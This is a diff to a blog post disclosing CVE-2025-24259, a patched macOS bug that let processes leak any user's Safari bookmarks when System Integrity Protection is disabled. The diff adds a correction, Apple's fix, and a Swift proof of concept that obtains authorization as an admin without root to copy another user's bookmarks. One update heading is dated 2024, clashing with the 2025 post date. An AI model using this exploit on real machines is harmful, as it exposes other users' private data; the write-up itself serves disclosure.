@@ -56,12 +56,15 @@
       <h1 itemprop="headline">CVE-2025-24259: Leaking Bookmarks on macOS</h1>
       <div id="about">
         <time itemprop="datePublished" datetime="2025-03-31">2025-03-31</time>
+        <span>(updated <time itemprop="dateModified" datetime="2025-03-31">2025-04-01</time>)</span>
         <address itemprop="author" itemscope itemtype="https://schema.org/Person">by <a itemprop="email" title="Send me and email" href="mailto:noah@wts.dev"><span itemprop="name">Noah Gregory</span></a>
       </div>
     </header>
     <h2>A Quick Summary</h2>
     <p>Happy Monday! You should probably update your Macs now. <a href="https://support.apple.com/en-us/122375">macOS Ventura 13.7.5</a>, <a href="https://support.apple.com/en-us/122374">macOS Sonoma 14.7.5</a>, and <a href="https://support.apple.com/en-us/122373">macOS Sequoia 15.4</a>, are out. They include a lot of patches, with 15.4 including patches for <a href="https://x.com/ClassicII_MrMac/status/1906782483942666496">131 CVE's.</a> If you're curious and want to validate that, just open the security release notes for that update and search for the string <q>CVE-202</q>. You'll find 131 matches on that page as of writing.</p>
-    <p>One of those CVE's, <b>CVE-2025-24259</b>, allowed root processes to leak the Safari bookmarks for any user.</p>
+    <p>One of those CVE's, <b>CVE-2025-24259</b>, allowed processes to leak the Safari bookmarks for any user <em>when <a href="https://developer.apple.com/documentation/security/disabling-and-enabling-system-integrity-protection">System Integrity Protection is disabled.</a></em></p>
+    <h3>Summary Update (2024-04-01)</h3>
+    <p>The original version of this article claimed that root was required to exploit this (<a target="_self" href="#poc-update">it actually is not</a>). The original version also neglected to mention that the disabling of <abbr title="System Integrity Protection">SIP</abbr> was required. This requirement was only learned after initial publication. When SIP is enabled, App Sandbox will actually deny the vulnerable daemon's attempt to access to the bookmarks.</p>
     <h2>A Brief Recap</h2>
     <p>For those of you who didn't read <a href="/posts/password-leak/">my last write-up</a>, here is the basic gist:</p>
     <ol>
@@ -104,6 +107,26 @@ let FCSafariCopyExistingBookmarks
 print(FCSafariCopyExistingBookmarks(CommandLine.arguments[1], Data()) as AnyObject)</code></pre>
     <p>Compiling the above code with <code>swiftc</code> and running the resulting executable as root would print out the Safari bookmarks of the specified user. I only tested against a single user in my tests, but I don't see why this would not work for all users on the device (especially as it is the daemon itself that is accessing the bookmarks, and it should have read-access to them all, regardless of the user).</p>
     <p>For those wondering, the second argument of <code>FCSafariCopyExistingBookmarks</code> takes in a <code><a href="https://developer.apple.com/documentation/foundation/data">Data</a></code> object representing the bytes of an <code><a href="https://developer.apple.com/documentation/security/authorizationexternalform">AuthorizationExternalForm</a></code>, which could be used to authorize the copying of the bookmarks. However, in the absence of a valid authorization object, <code>parentalcontrolsd</code> would still allow root callers to copy the bookmarks, so we pass an empty <code>Data</code> object.</p>
+    <h3 id="poc-update">PoC Update (2024-04-01)</h3>
+    <p>It turns out, getting the proper authorization isn't that difficult. The below code can be run as an admin user, without root, to get the bookmarks. Thank you to the security researcher who contacted me and let me know this. I hadn't bothered with the <code>Authorization</code> part because I thought it would potentially require user interaction (but it seems that it does not).</p>
+    <pre><code>var rightName = "com.apple.Safari.parental-controls"
+rightName.withCString { rightNameCString in
+    var authRef: AuthorizationRef? = nil;
+    let authCreateStatus = AuthorizationCreate(nil, nil, [], &authRef)
+    guard authCreateStatus == errAuthorizationSuccess else { return }
+    defer { AuthorizationFree(authRef!, []) }
+    var right = AuthorizationItem(name: rightNameCString, valueLength: 0, value: nil, flags: 0)
+    withUnsafeMutableBytes(of: &right) { rightPointer in
+        var rights = AuthorizationRights(count: 1, items: rightPointer.assumingMemoryBound(to: AuthorizationItem.self).baseAddress)
+        let copyRightsStatus = AuthorizationCopyRights(authRef!, &rights, nil, [.interactionAllowed, .extendRights], nil)
+        guard copyRightsStatus == errAuthorizationSuccess else { return }
+        var extForm: AuthorizationExternalForm = AuthorizationExternalForm();
+        let externalFormCreate = AuthorizationMakeExternalForm(authRef!, &extForm)
+        guard externalFormCreate == errAuthorizationSuccess else { return }
+        let extFormData = Data(bytes: &extForm, count: MemoryLayout&lt;AuthorizationExternalForm&gt;.size)
+        print(FCSafariCopyExistingBookmarks(CommandLine.arguments[1], extFormData))
+    }
+}</code></pre>
     <h2>Apple's Solution</h2>
     <p>Apple's solution here was, again, adding an entitlement check. Now, <code>parentalcontrolsd</code> will ignore clients that don't have the <code>com.apple.private.parentalcontrols</code> entitlement key with a boolean value of <code>true</code> when they try to call that specific MIG routine to copy Safari bookmarks.</p>
     <h2>Conclusion</h2>
